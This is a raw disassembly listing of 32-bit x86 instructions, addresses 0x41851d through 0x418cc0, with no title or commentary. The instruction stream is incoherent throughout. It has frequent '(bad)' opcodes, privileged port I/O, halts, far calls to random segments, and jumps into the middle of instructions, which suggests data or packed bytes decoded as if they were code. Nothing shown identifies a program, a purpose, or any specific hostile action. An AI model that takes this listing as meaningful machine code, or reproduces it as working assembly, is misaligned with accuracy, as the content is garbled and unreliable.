  41851d:	in     al,dx
  41851e:	inc    esp
  41851f:	in     al,dx
  418520:	pop    eax
  418521:	mov    ds:0x6f8ef9ac,eax
  418526:	xor    BYTE PTR [edx],0x88
  418529:	jecxz  0x418585
  41852b:	lock push edi
  41852d:	push   cs
  41852e:	scas   al,BYTE PTR es:[edi]
  41852f:	mov    bl,0x61
  418531:	xor    ch,BYTE PTR [edi+0xa]
  418534:	ds (bad) 
  418536:	adc    DWORD PTR [edx+0x719076af],ecx
  41853c:	ja     0x418559
  41853e:	(bad)  
  41853f:	adc    BYTE PTR [ebx],cl
  418541:	jg     0x41859b
  418543:	mov    esi,0xd41138b0
  418548:	pushf  
  418549:	sbb    bh,dh
  41854b:	xchg   ebp,eax
  41854c:	inc    esi
  41854d:	mov    ecx,0x145716cb
  418552:	pop    es
  418553:	pop    ebp
  418554:	ds adc eax,0xa025915a
  41855a:	jo     0x418562
  41855c:	mov    cl,BYTE PTR [esi-0x4cca7cfb]
  418562:	pop    ebx
  418563:	pop    ecx
  418564:	gs dec esi
  418566:	push   edi
  418567:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418568:	inc    ecx
  418569:	or     DWORD PTR ss:[edx],0x58b583fb
  418570:	popa   
  418571:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  418573:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418574:	mov    dl,0x0
  418576:	rol    DWORD PTR [eax+0x125f521b],1
  41857c:	lds    eax,FWORD PTR [eax]
  41857e:	and    DWORD PTR [edi],0x618d4157
  418584:	out    dx,eax
  418585:	dec    esp
  418586:	repnz pop edx
  418588:	mov    ebp,0x78cfca7e
  41858d:	scas   al,BYTE PTR es:[edi]
  41858e:	push   esp
  41858f:	adc    ecx,DWORD PTR [ebx+eax*1+0x7f]
  418593:	jg     0x41858f
  418595:	sub    eax,0x8ee1f19f
  41859a:	jae    0x418557
  41859c:	aam    0xcf
  41859e:	enter  0x52b2,0x4b
  4185a2:	xchg   esp,eax
  4185a3:	addr16 xchg edx,eax
  4185a5:	jae    0x4185c2
  4185a7:	shl    DWORD PTR [edx+0x64917b19],cl
  4185ad:	sbb    bh,BYTE PTR [ebx+0x51]
  4185b0:	sbb    bl,ah
  4185b2:	sbb    ecx,eax
  4185b4:	lods   eax,DWORD PTR ds:[esi]
  4185b5:	push   edi
  4185b6:	aaa    
  4185b7:	mov    ebp,0x589d3a19
  4185bc:	xchg   esp,edx
  4185be:	adc    al,BYTE PTR [ecx+0x26]
  4185c1:	jle    0x4185be
  4185c3:	test   eax,0xe5b570a9
  4185c8:	sub    al,0xb6
  4185ca:	inc    edi
  4185cb:	cld    
  4185cc:	pop    ebx
  4185cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4185ce:	or     BYTE PTR gs:[eax+eax*8],ah
  4185d2:	and    dh,dl
  4185d4:	pop    eax
  4185d5:	hlt    
  4185d6:	cli    
  4185d7:	add    ah,BYTE PTR [ebp-0x2a]
  4185da:	retf   
  4185db:	aad    0xc8
  4185dd:	dec    esp
  4185de:	call   0x1762:0xd3f62338
  4185e5:	leave  
  4185e6:	(bad)  
  4185e7:	jmp    0x4185a5
  4185e9:	inc    ebp
  4185ea:	fistp  QWORD PTR [esi-0x59]
  4185ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4185ee:	push   ss
  4185ef:	sti    
  4185f0:	aas    
  4185f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4185f2:	and    eax,0x81d3173
  4185f7:	mov    cl,0xd7
  4185f9:	xlat   BYTE PTR ds:[ebx]
  4185fa:	jae    0x418604
  4185fc:	xlat   BYTE PTR ds:[ebx]
  4185fd:	xchg   ecx,eax
  4185fe:	cld    
  4185ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418600:	push   edx
  418601:	rol    BYTE PTR [ebx+0x11790fb7],0x62
  418608:	addr16 dec esi
  41860a:	xchg   esp,eax
  41860b:	sbb    al,0x8
  41860d:	push   ecx
  41860e:	sbb    DWORD PTR [ebx],ebx
  418610:	dec    esi
  418611:	dec    ebx
  418612:	mov    bl,BYTE PTR [eax+0x4b]
  418615:	adc    DWORD PTR [ecx+0x41ff376],0x3976531a
  41861f:	cmp    BYTE PTR [edi+esi*2-0x46],dl
  418623:	sbb    BYTE PTR [eax-0x3ac91726],0xbf
  41862a:	in     al,dx
  41862b:	sbb    BYTE PTR [eax+0x729a88d4],dh
  418631:	mov    ds:0x7351a02f,eax
  418636:	jp     0x4186a8
  418638:	(bad)  
  418639:	daa    
  41863a:	std    
  41863b:	(bad)  
  41863d:	cwde   
  41863e:	pop    edx
  41863f:	hlt    
  418640:	push   ecx
  418641:	dec    esp
  418642:	jo     0x418649
  418644:	sbb    esi,DWORD PTR [ecx-0x28]
  418647:	aaa    
  418648:	xor    al,0xf
  41864a:	out    dx,al
  41864b:	adc    al,0xab
  41864d:	addr16 jmp 0x41869b
  418650:	or     DWORD PTR [ecx],eax
  418652:	or     eax,0x664d840b
  418657:	mov    esp,DWORD PTR [ebx-0x6886575c]
  41865d:	outs   dx,BYTE PTR ds:[esi]
  41865e:	scas   al,BYTE PTR es:[edi]
  41865f:	div    BYTE PTR [ecx+0x68]
  418662:	arpl   WORD PTR [ebp+0x3b975ed9],si
  418668:	jmp    0x7dbee029
  41866d:	push   cs
  41866e:	jnp    0x418653
  418670:	dec    edi
  418671:	test   BYTE PTR [ecx],dl
  418673:	adc    DWORD PTR [esp+ecx*2],edi
  418676:	push   ds
  418677:	adc    BYTE PTR [ecx+0x3b477efb],dh
  41867d:	loope  0x418667
  41867f:	rcl    BYTE PTR [ebx-0x23d20e63],cl
  418685:	mov    ds:0x60824d47,eax
  41868a:	(bad)  
  41868c:	sbb    DWORD PTR [esp+esi*8],esi
  41868f:	cmp    al,0x8
  418691:	in     eax,0xa
  418693:	rcl    DWORD PTR [edi+0x13],1
  418696:	mov    edx,0xa5e78a2d
  41869b:	mov    eax,ds:0x399bb2c0
  4186a0:	out    dx,al
  4186a1:	mov    bh,0xe2
  4186a3:	cmp    bh,BYTE PTR [ebx+0x32]
  4186a6:	pop    ds
  4186a7:	stos   BYTE PTR es:[edi],al
  4186a8:	mov    ds:0xf41b86c3,eax
  4186ad:	icebp  
  4186ae:	(bad)  
  4186af:	sbb    al,0xe8
  4186b1:	rcr    esp,0x6a
  4186b4:	mov    esp,0xe9a4118e
  4186b9:	xlat   BYTE PTR ds:[ebx]
  4186ba:	add    cl,BYTE PTR [edi]
  4186bc:	stc    
  4186bd:	and    dl,BYTE PTR [ebx]
  4186bf:	pushf  
  4186c0:	add    DWORD PTR [edi-0x3d],ecx
  4186c3:	sub    ch,BYTE PTR [edx]
  4186c5:	loope  0x418702
  4186c7:	pop    di
  4186c9:	push   0xfffffff3
  4186cb:	and    al,dh
  4186cd:	push   es
  4186ce:	xchg   sp,ax
  4186d0:	dec    esp
  4186d1:	fwait
  4186d2:	cs int 0x50
  4186d5:	xchg   esi,eax
  4186d6:	and    BYTE PTR [eax+ecx*8],bl
  4186d9:	mov    eax,0x7e680c00
  4186de:	sti    
  4186df:	stos   DWORD PTR es:[edi],eax
  4186e0:	add    edi,ebp
  4186e2:	mov    dl,0x43
  4186e4:	ret    
  4186e5:	mov    al,0xb0
  4186e7:	(bad)  
  4186e8:	shl    ecx,0x42
  4186eb:	adc    BYTE PTR [ebx-0xe06f21],ch
  4186f1:	mov    DWORD PTR [edx+0x71],edx
  4186f4:	pop    ds
  4186f5:	sahf   
  4186f6:	push   cs
  4186f7:	retf   
  4186f8:	shr    BYTE PTR [esi-0x71],0x6c
  4186fc:	or     dh,ah
  4186fe:	mov    dh,0x4c
  418700:	dec    edx
  418701:	std    
  418702:	push   es
  418703:	jle    0x418725
  418705:	mov    ds:0x784a2b2d,al
  41870a:	das    
  41870b:	jmp    edi
  41870d:	xchg   BYTE PTR [eax+0x41ee3650],cl
  418713:	push   edx
  418714:	add    DWORD PTR [edx],esi
  418716:	sub    DWORD PTR [esi+0x5d],0x7d
  41871a:	es out 0xab,eax
  41871d:	call   0xfa86:0xef224ea6
  418724:	aaa    
  418725:	add    bh,BYTE PTR [edx+eax*1+0x13]
  418729:	jge    0x418730
  41872b:	rol    dl,cl
  41872d:	push   ebx
  41872e:	sub    eax,0xc07950be
  418733:	repnz arpl WORD PTR [eax-0x446ca9a4],si
  41873a:	pop    ds
  41873b:	push   ebp
  41873c:	xchg   ebx,eax
  41873d:	inc    ebx
  41873e:	ss repnz and ah,dh
  418742:	fsubr  st,st(2)
  418744:	xchg   ecx,eax
  418745:	(bad)  
  418746:	loope  0x418750
  418748:	rcl    edi,0xe4
  41874b:	ja     0x4187bc
  41874d:	sub    eax,0x6d850fbd
  418752:	in     al,dx
  418753:	fimul  DWORD PTR [ebp-0x2a8ef5ec]
  418759:	xlat   BYTE PTR ds:[ebx]
  41875a:	jb     0x418796
  41875c:	test   eax,0xc87fedb9
  418761:	(bad)  
  418762:	push   esp
  418763:	sar    BYTE PTR [edi],0x3c
  418766:	xchg   ebp,eax
  418767:	pusha  
  418768:	push   ebp
  418769:	arpl   ax,cx
  41876b:	and    al,0xfc
  41876d:	(bad)  
  41876f:	fucomi st,st(6)
  418771:	push   ebx
  418772:	xchg   edi,edi
  418774:	scas   eax,DWORD PTR es:[edi]
  418775:	pop    edi
  418776:	mov    ch,0x28
  418778:	mov    edi,eax
  41877a:	shl    BYTE PTR [edi+0x5949b857],cl
  418780:	clc    
  418781:	xor    eax,0xf00af4d4
  418786:	cmp    ah,dh
  418788:	pop    ecx
  418789:	mov    esi,0x33fe1991
  41878e:	push   ecx
  41878f:	stos   DWORD PTR es:[edi],eax
  418790:	sub    esp,DWORD PTR [ecx-0x4c]
  418793:	retf   0xcc11
  418796:	jg     0x4187ee
  418798:	mov    bl,0xed
  41879a:	std    
  41879b:	mov    sp,0xf06b
  41879f:	fcmove st,st(5)
  4187a1:	sti    
  4187a2:	push   edx
  4187a3:	mov    bl,ch
  4187a5:	mov    BYTE PTR [ecx],bh
  4187a7:	sub    edi,ebp
  4187a9:	int3   
  4187aa:	and    ebx,esi
  4187ac:	mov    ds:0x4db09926,al
  4187b1:	adc    DWORD PTR [ebp-0x211ca61a],eax
  4187b7:	adc    eax,0x67efb66f
  4187bc:	cdq    
  4187bd:	(bad)  
  4187be:	clc    
  4187bf:	cmp    eax,0x6e7283f5
  4187c4:	in     eax,dx
  4187c5:	nop
  4187c6:	jg     0x711d8b02
  4187cc:	out    0xf1,al
  4187ce:	mov    esp,0x6beab521
  4187d3:	cmp    esp,edx
  4187d5:	sbb    BYTE PTR [eax],ah
  4187d7:	sub    eax,0x758172b9
  4187dc:	cdq    
  4187dd:	scas   eax,DWORD PTR es:[edi]
  4187de:	call   0xcedca3e0
  4187e3:	pop    ds
  4187e4:	jno    0x41883e
  4187e6:	outs   dx,BYTE PTR ds:[esi]
  4187e7:	fldz   
  4187e9:	retf   
  4187ea:	jle    0x4187e9
  4187ec:	sti    
  4187ed:	jae    0x4187ff
  4187ef:	test   BYTE PTR [edx+edx*1+0x74],bh
  4187f3:	ret    0x488e
  4187f6:	mov    esp,0x46258b7a
  4187fb:	call   0x4059:0x3f11999d
  418802:	cmp    BYTE PTR [eax+edx*4],al
  418805:	xchg   esi,eax
  418806:	xchg   BYTE PTR [ebp-0x6a],al
  418809:	dec    eax
  41880a:	sbb    edi,edi
  41880c:	mov    al,ds:0xa8cda9fb
  418811:	icebp  
  418812:	mov    cs,WORD PTR [eax-0x56]
  418815:	fwait
  418816:	mov    WORD PTR [eax+0x1036e931],?
  41881c:	sar    BYTE PTR ss:[eax],cl
  41881f:	sti    
  418820:	je     0x418836
  418822:	addr16 mov dh,0x7f
  418825:	les    esp,FWORD PTR [esi]
  418827:	xor    BYTE PTR [edx+0x37],0xe6
  41882b:	mov    al,ds:0xdbb0fa67
  418830:	scas   al,BYTE PTR es:[edi]
  418831:	(bad)  
  418832:	push   esi
  418833:	inc    edi
  418834:	dec    ecx
  418835:	push   edx
  418836:	push   cs
  418837:	test   BYTE PTR [edi-0xc51defa],bl
  41883d:	add    ebx,eax
  41883f:	inc    esi
  418840:	xlat   BYTE PTR ds:[ebx]
  418841:	or     al,0x6b
  418843:	sar    cl,cl
  418845:	sub    eax,DWORD PTR [ecx-0x30c426dd]
  41884b:	pop    edx
  41884c:	pusha  
  41884d:	hlt    
  41884e:	push   ss
  41884f:	sub    al,BYTE PTR [ebx+0x55]
  418852:	pop    es
  418853:	xchg   BYTE PTR [ebx-0x14],cl
  418856:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418857:	pusha  
  418858:	call   0x8ae4:0x28be2c46
  41885f:	adc    eax,0xa96e13cf
  418864:	retf   0x9fa1
  418867:	(bad)  
  418868:	mov    esp,0xb60cff62
  41886d:	cwde   
  41886e:	pop    ss
  41886f:	or     edi,ebp
  418871:	pop    ecx
  418872:	sar    BYTE PTR [eax-0x45],1
  418875:	xchg   ebx,eax
  418876:	pop    eax
  418877:	dec    ebp
  418878:	adc    cl,bh
  41887a:	pushf  
  41887b:	and    al,0xb5
  41887d:	mov    edi,0xde289ebd
  418882:	add    ah,BYTE PTR [ebx+0x3f]
  418885:	push   ebx
  418886:	out    dx,eax
  418887:	retf   
  418888:	mul    bl
  41888a:	or     BYTE PTR [ebx],0xe4
  41888d:	xchg   DWORD PTR [edx],esi
  41888f:	xor    edi,DWORD PTR [ecx]
  418891:	adc    BYTE PTR [edx+ecx*4-0x463be4c8],bh
  418898:	dec    edx
  418899:	frstor [edi-0x58f821b0]
  41889f:	sbb    bl,0x46
  4188a2:	and    DWORD PTR [ecx-0x7d],edi
  4188a5:	dec    ebx
  4188a6:	or     BYTE PTR [edi-0x1a],dh
  4188a9:	mov    ds:0xa838d02e,eax
  4188ae:	pop    ss
  4188af:	mov    ?,WORD PTR [ecx]
  4188b1:	push   ss
  4188b2:	push   es
  4188b3:	inc    ebp
  4188b4:	(bad)  
  4188b5:	loopne 0x4188e9
  4188b7:	xchg   edi,eax
  4188b8:	and    eax,DWORD PTR [edx-0x1c]
  4188bb:	out    0x2d,al
  4188bd:	sbb    BYTE PTR [esi],bh
  4188bf:	popf   
  4188c0:	inc    esp
  4188c1:	adc    ebx,ebx
  4188c3:	jge    0x418931
  4188c5:	push   0x55
  4188c7:	sbb    BYTE PTR [edx+0x21],cl
  4188ca:	rcr    al,1
  4188cc:	out    dx,al
  4188cd:	xchg   ebp,eax
  4188ce:	scas   eax,DWORD PTR es:[edi]
  4188cf:	aas    
  4188d0:	in     eax,0xd
  4188d2:	pop    ss
  4188d3:	f2xm1  
  4188d5:	test   ah,al
  4188d7:	sub    ch,BYTE PTR [eax-0x2]
  4188da:	data16 fild WORD PTR [ecx]
  4188dd:	data16 ss aas 
  4188e0:	sub    bh,dl
  4188e2:	ins    BYTE PTR es:[edi],dx
  4188e3:	pusha  
  4188e4:	sbb    eax,0x52b88c83
  4188e9:	xor    BYTE PTR ds:0xe2b4dae6,0x6e
  4188f0:	xchg   BYTE PTR [ecx],al
  4188f2:	mov    eax,0x2dace917
  4188f7:	loope  0x41894b
  4188f9:	jno    0x418892
  4188fb:	jmp    0x418945
  4188fd:	fisttp WORD PTR [ebx+0x51f97847]
  418903:	shl    DWORD PTR [ecx],1
  418905:	out    dx,al
  418906:	sbb    ebp,0x9ce19ebe
  41890c:	pop    edi
  41890d:	test   DWORD PTR gs:[ebx-0x14156415],edx
  418914:	push   ss
  418915:	gs mov esp,edx
  418918:	jb     0x41890b
  41891a:	rol    BYTE PTR [ebx-0x46e919fc],cl
  418920:	xchg   ecx,eax
  418921:	or     edx,ecx
  418923:	add    BYTE PTR ds:0x4acd9ee0,bl
  418929:	or     edx,eax
  41892b:	out    dx,al
  41892c:	inc    ebp
  41892d:	sub    al,0x48
  41892f:	popa   
  418930:	shr    BYTE PTR [edx+eiz*2],cl
  418933:	popf   
  418934:	cmp    al,0x14
  418936:	jg     0x4188c0
  418938:	mov    esi,0xd76a5294
  41893d:	scas   al,BYTE PTR es:[edi]
  41893e:	cmc    
  41893f:	push   ebp
  418940:	dec    ebx
  418941:	pop    ebp
  418942:	jb     0x41897c
  418944:	and    eax,DWORD PTR [esi-0x321e449e]
  41894a:	pop    es
  41894b:	or     BYTE PTR [ebx],cl
  41894d:	add    al,0xb4
  41894f:	push   ecx
  418950:	clc    
  418951:	hlt    
  418952:	test   eax,0xeaaac498
  418957:	mov    eax,0xf17d4dfb
  41895c:	aaa    
  41895d:	(bad)  
  41895e:	aas    
  41895f:	dec    edi
  418960:	sub    BYTE PTR [esi],dh
  418962:	jbe    0x41897a
  418964:	idiv   DWORD PTR [ebp+0x65bba6bf]
  41896a:	mov    ecx,0xae34e82b
  41896f:	add    BYTE PTR [eax+edx*8],bh
  418972:	loop   0x41898b
  418974:	jae    0x418958
  418976:	stos   DWORD PTR es:[edi],eax
  418977:	shl    edi,cl
  418979:	gs or  eax,0x4edf949
  41897f:	icebp  
  418980:	adc    eax,esi
  418982:	cmc    
  418983:	push   ecx
  418984:	fcmovu st,st(6)
  418986:	mov    ch,0xc3
  418988:	loop   0x41898d
  41898a:	pop    esp
  41898b:	shr    ebp,1
  41898d:	adc    eax,0x76f1a82d
  418992:	add    BYTE PTR [edi+0x69],0x9e
  418996:	outs   dx,DWORD PTR ds:[esi]
  418997:	fsub   DWORD PTR cs:[eax]
  41899a:	(bad)  
  41899b:	and    BYTE PTR [edx],ch
  41899d:	mov    BYTE PTR [esi+0x3a135a7f],bh
  4189a3:	jecxz  0x4189bf
  4189a5:	jb     0x418994
  4189a7:	(bad)  
  4189a8:	lods   al,BYTE PTR ds:[esi]
  4189a9:	add    BYTE PTR [ecx+0x12],ch
  4189ac:	jp     0x418a1e
  4189ae:	clc    
  4189af:	int    0x54
  4189b1:	sbb    al,0xb0
  4189b3:	mov    esp,0x7c3deac4
  4189b8:	(bad)  
  4189b9:	stc    
  4189ba:	pop    edi
  4189bb:	jle    0x4189a3
  4189bd:	jge    0x418974
  4189bf:	sbb    esp,DWORD PTR [edx+0x627d9886]
  4189c5:	int    0x8d
  4189c7:	js     0x4189bc
  4189c9:	loope  0x4189da
  4189cb:	and    BYTE PTR [esi-0x3ad9fb84],ch
  4189d1:	and    edx,0x437b548e
  4189d7:	sub    DWORD PTR [ebx-0x2b],edi
  4189da:	sar    DWORD PTR [eax],cl
  4189dc:	xchg   edi,eax
  4189dd:	adc    al,0x90
  4189df:	das    
  4189e0:	xchg   DWORD PTR [edi-0x2a730c7],esi
  4189e6:	sub    eax,0xd8529cae
  4189eb:	mov    edi,0x75d27cfa
  4189f0:	cmc    
  4189f1:	sbb    dl,BYTE PTR [edx-0x21]
  4189f4:	sbb    BYTE PTR [ebp-0x35],al
  4189f7:	sbb    DWORD PTR [edi+eiz*1],esp
  4189fa:	aas    
  4189fb:	inc    ebx
  4189fc:	ins    BYTE PTR es:[edi],dx
  4189fd:	xchg   esi,eax
  4189fe:	outs   dx,DWORD PTR ds:[esi]
  4189ff:	(bad)  
  418a00:	fiadd  DWORD PTR [ebp+0x5bd932ed]
  418a06:	fiadd  DWORD PTR [edi+0x4eca246a]
  418a0c:	mov    eax,0x9a01f6a5
  418a11:	inc    esp
  418a12:	mov    ds:0xd3edf7e8,al
  418a17:	imul   ecx,DWORD PTR [esi+eiz*2-0x73bbf766],0xed6f176b
  418a22:	mov    al,0x95
  418a24:	ins    DWORD PTR es:[edi],dx
  418a25:	mul    BYTE PTR [edx+0xbe2b626]
  418a2b:	lock ins DWORD PTR es:[edi],dx
  418a2d:	into   
  418a2e:	ins    BYTE PTR es:[edi],dx
  418a2f:	jecxz  0x418a86
  418a31:	inc    eax
  418a32:	xchg   ecx,ecx
  418a34:	fnstenv [eax]
  418a36:	ins    DWORD PTR es:[edi],dx
  418a37:	cli    
  418a38:	ds dec edi
  418a3a:	cmp    bl,BYTE PTR [edx+0x16]
  418a3d:	sar    DWORD PTR [ecx],cl
  418a3f:	mov    ecx,0xcae1d16f
  418a44:	mov    edx,0x26c26ee0
  418a49:	std    
  418a4a:	adc    eax,0xc9cdc4c6
  418a4f:	sub    bl,bh
  418a51:	sbb    ch,0x16
  418a54:	mov    bl,0x7b
  418a56:	cmp    al,0xdc
  418a58:	sub    DWORD PTR [ecx+0x37],esi
  418a5b:	jne    0x418aab
  418a5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a5e:	jecxz  0x418a02
  418a60:	in     eax,dx
  418a61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a62:	push   ebx
  418a63:	idiv   DWORD PTR [ebx-0x1579e153]
  418a69:	mov    al,ds:0xaf7d54cf
  418a6e:	mov    eax,ds:0xe8cf67cb
  418a73:	out    0x13,al
  418a75:	int    0xf4
  418a77:	int    0xae
  418a79:	sub    bl,BYTE PTR [ebp+eiz*1+0x7e74be31]
  418a80:	pushf  
  418a81:	scas   eax,DWORD PTR es:[edi]
  418a82:	call   0xa236:0xff0edd22
  418a89:	mov    ecx,ebp
  418a8b:	nop
  418a8c:	and    cl,BYTE PTR [edx]
  418a8e:	adc    BYTE PTR [edi],bl
  418a90:	imul   esp,DWORD PTR [ecx+0x7b],0x17
  418a94:	mov    esp,0x85aec6b7
  418a99:	icebp  
  418a9a:	push   cs
  418a9b:	inc    ebx
  418a9c:	fbstp  TBYTE PTR [edx+0x73]
  418a9f:	test   al,0xca
  418aa1:	popa   
  418aa2:	jb     0x418aee
  418aa4:	jb     0x418a65
  418aa6:	mov    ebx,0x51823a7a
  418aab:	cmp    DWORD PTR [eax-0x4ad181c9],0xfffffff7
  418ab2:	xchg   edi,eax
  418ab3:	jecxz  0x418a5f
  418ab5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ab6:	push   0xfdf9eaec
  418abb:	jb     0x418ae5
  418abd:	pop    ecx
  418abe:	out    0x88,al
  418ac0:	hlt    
  418ac1:	std    
  418ac2:	cwde   
  418ac3:	(bad)  
  418ac4:	mov    ecx,0xef7ea0c1
  418ac9:	scas   al,BYTE PTR es:[edi]
  418aca:	adc    eax,0x22ee9fd
  418acf:	leave  
  418ad0:	add    edx,DWORD PTR [ebp-0x7c]
  418ad3:	repnz lock arpl WORD PTR [ebp-0x31c98314],dx
  418adb:	div    DWORD PTR [ecx]
  418add:	dec    eax
  418ade:	xchg   ebp,eax
  418adf:	mov    ah,0x78
  418ae1:	lock pusha 
  418ae3:	adc    eax,0x7613ef5b
  418ae8:	shl    BYTE PTR [ecx],1
  418aea:	aad    0x9e
  418aec:	add    eax,0x1bceb9a6
  418af1:	inc    ebx
  418af2:	rcr    eax,cl
  418af4:	rcr    DWORD PTR [esi],0x9f
  418af7:	in     eax,0x45
  418af9:	mov    DWORD PTR [edi+eax*8+0x3599e3d],ecx
  418b00:	xor    al,0xb
  418b02:	push   esi
  418b03:	loopne 0x418ac7
  418b05:	mov    dh,0x65
  418b07:	mov    ds:0xe9e74c0b,eax
  418b0c:	sti    
  418b0d:	xchg   esi,eax
  418b0e:	fcmovne st,st(3)
  418b10:	out    dx,eax
  418b11:	mov    al,0xee
  418b13:	push   cs
  418b14:	ins    BYTE PTR es:[edi],dx
  418b15:	fdivr  st,st(1)
  418b17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b18:	(bad)  
  418b19:	and    esi,DWORD PTR [edi+edx*1-0x469158d]
  418b20:	es sbb eax,0xe91c9beb
  418b26:	pop    ecx
  418b27:	sbb    eax,0x74d74d30
  418b2c:	mov    dl,0xd2
  418b2e:	jo     0x418b9a
  418b30:	mov    eax,DWORD PTR [esp+edi*8+0x16]
  418b34:	push   edi
  418b35:	(bad)  
  418b36:	push   0x7e
  418b38:	fisttp WORD PTR [eax]
  418b3a:	adc    ebx,DWORD PTR [ecx+0x38]
  418b3d:	adc    eax,0x1bec8b96
  418b42:	fwait
  418b43:	jp     0x418ba5
  418b45:	sbb    esp,ecx
  418b47:	add    bl,al
  418b49:	push   0x1b
  418b4b:	mov    ch,0x26
  418b4d:	cmp    al,0xb9
  418b4f:	call   0x2f3c1bd6
  418b54:	in     al,dx
  418b55:	jns    0x418af1
  418b57:	sbb    eax,0xed3b311b
  418b5c:	lea    ebp,[edi+0x62]
  418b5f:	cmp    eax,0x5d400eed
  418b64:	jo     0x418bde
  418b66:	pop    edx
  418b67:	adc    edx,edi
  418b69:	shl    al,cl
  418b6b:	stos   BYTE PTR es:[edi],al
  418b6c:	dec    ecx
  418b6d:	lahf   
  418b6e:	jns    0x418b45
  418b70:	mov    WORD PTR [ecx-0x6f8c9d57],gs
  418b76:	cs push eax
  418b78:	xor    bh,bh
  418b7a:	retf   0xaac0
  418b7d:	jne    0x418b7a
  418b7f:	cmp    dh,BYTE PTR [edi+0x63719268]
  418b85:	jge    0x418bda
  418b87:	call   0x3adfcece
  418b8c:	fidivr DWORD PTR [ecx-0x7f]
  418b8f:	das    
  418b90:	fild   QWORD PTR [eax+ecx*2+0x42]
  418b94:	into   
  418b95:	add    al,0x18
  418b97:	outs   dx,BYTE PTR ds:[esi]
  418b98:	jmp    0x68dbbd86
  418b9d:	pop    ss
  418b9e:	dec    edi
  418b9f:	mov    dl,0x57
  418ba1:	(bad)  
  418ba2:	cs fsubrp st(2),st
  418ba5:	add    bl,cl
  418ba7:	push   edx
  418ba8:	mov    ds:0xb2bd2df1,al
  418bad:	aad    0xdc
  418baf:	repz sahf 
  418bb1:	and    ecx,DWORD PTR [ebp-0x37596dee]
  418bb7:	(bad)  
  418bb9:	loop   0x418b3d
  418bbb:	test   DWORD PTR [esi+0x5],edx
  418bbe:	pop    eax
  418bbf:	jmp    0x8b2ee39f
  418bc4:	inc    esp
  418bc5:	js     0x418b8f
  418bc7:	shr    DWORD PTR [ebx+0x44021c7a],1
  418bcd:	int3   
  418bce:	sbb    BYTE PTR [edi+esi*1+0x2f],bl
  418bd2:	add    dl,BYTE PTR [esi+eax*1-0x63]
  418bd6:	jns    0x418b5b
  418bd8:	dec    esi
  418bd9:	fidivr DWORD PTR [edi]
  418bdb:	(bad)  
  418bdc:	retf   
  418bdd:	mov    gs,WORD PTR [esi]
  418bdf:	inc    DWORD PTR [edi]
  418be1:	ja     0x418bc7
  418be3:	mov    edi,0x42147392
  418be8:	adc    dh,cl
  418bea:	nop    ebx
  418bed:	xchg   edx,eax
  418bee:	aas    
  418bef:	mov    edx,0xe1821e95
  418bf4:	in     al,dx
  418bf5:	jmp    0x585e79d7
  418bfa:	jl     0x418b7c
  418bfc:	(bad)  
  418bfd:	jo     0x418c21
  418bff:	sbb    eax,DWORD PTR [ebx-0x5429f6a9]
  418c05:	add    DWORD PTR [ebx+0x47],eax
  418c08:	je     0x418b8d
  418c0a:	mul    BYTE PTR [ebx]
  418c0c:	(bad)  
  418c0d:	out    dx,eax
  418c0e:	dec    esi
  418c0f:	dec    eax
  418c10:	arpl   WORD PTR [eax-0x450f5fc0],sp
  418c16:	cs xchg ebp,eax
  418c18:	mov    edi,0x33d29077
  418c1d:	jl     0x418c5d
  418c1f:	retf   
  418c20:	out    dx,eax
  418c21:	jno    0x418c06
  418c23:	repz std 
  418c25:	jo     0x418c26
  418c27:	inc    ebx
  418c28:	call   0x3e27aaa7
  418c2d:	add    DWORD PTR [esi],esi
  418c2f:	hlt    
  418c30:	mov    ds:0x660cd7c8,eax
  418c35:	sbb    al,0x8f
  418c37:	and    eax,0xfc883622
  418c3c:	in     eax,0xb
  418c3e:	popf   
  418c3f:	adc    ecx,esi
  418c41:	mov    edx,0xb88ea7b6
  418c46:	das    
  418c47:	cli    
  418c48:	ins    BYTE PTR es:[edi],dx
  418c49:	jg     0x418ca2
  418c4b:	mov    eax,es:0x3e9dd929
  418c51:	clc    
  418c52:	jge    0x418cb8
  418c54:	jle    0x418c5b
  418c56:	xchg   esi,eax
  418c57:	cli    
  418c58:	xor    BYTE PTR [edx],ah
  418c5a:	jnp    0x418c77
  418c5c:	pop    edx
  418c5d:	cmc    
  418c5e:	pop    ebx
  418c5f:	nop
  418c60:	mov    ecx,edi
  418c62:	retf   0x7ecd
  418c65:	add    eax,0x549a05ae
  418c6a:	xor    al,0x28
  418c6c:	push   0xffffff81
  418c6e:	push   cs
  418c6f:	mov    cl,0x2
  418c71:	cmp    dh,BYTE PTR [eax+edx*4+0x7d]
  418c75:	loope  0x418c78
  418c77:	(bad)  
  418c78:	mov    ebp,0x5f38fb8c
  418c7d:	js     0x418cd5
  418c7f:	cli    
  418c80:	jbe    0x418c6a
  418c82:	in     eax,0x31
  418c84:	popa   
  418c85:	push   edx
  418c86:	dec    ebx
  418c87:	outs   dx,BYTE PTR ds:[esi]
  418c88:	aaa    
  418c89:	jne    0x418cc9
  418c8b:	outs   dx,DWORD PTR ds:[esi]
  418c8c:	cmp    al,0xcd
  418c8e:	jne    0x418cf8
  418c90:	clc    
  418c91:	xor    bh,BYTE PTR [ebp+0x704792d7]
  418c97:	jl     0x418c8d
  418c99:	pop    ecx
  418c9a:	adc    esp,0x9da5a7f6
  418ca0:	js     0x418cf0
  418ca2:	std    
  418ca3:	cwde   
  418ca4:	je     0x418c45
  418ca6:	in     eax,dx
  418ca7:	cmp    al,0x95
  418ca9:	sbb    eax,0xb78959f2
  418cae:	xor    DWORD PTR [ebx+edi*2-0x7c],edx
  418cb2:	in     eax,0xea
  418cb4:	ins    BYTE PTR es:[edi],dx
  418cb5:	mov    esp,0x1b5b7481
  418cba:	(bad)  
  418cbb:	in     eax,dx
  418cbc:	mov    ch,0x65
  418cbe:	leave  
  418cbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418cc0:	jns    0x418c6d
